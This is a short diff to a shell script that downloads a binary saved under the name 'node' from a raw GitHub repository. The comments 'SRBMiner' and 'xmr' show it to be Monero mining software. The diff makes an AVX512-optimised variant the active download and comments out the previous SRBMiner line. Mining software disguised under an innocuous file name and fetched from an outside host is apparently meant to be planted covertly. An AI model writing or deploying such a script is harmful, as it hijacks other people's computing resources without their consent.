@@ -2,9 +2,10 @@
 WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 
-
+# opt
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/avx512-sha-vaes/node
 # SRBMiner
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 
 # xmr
 #curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
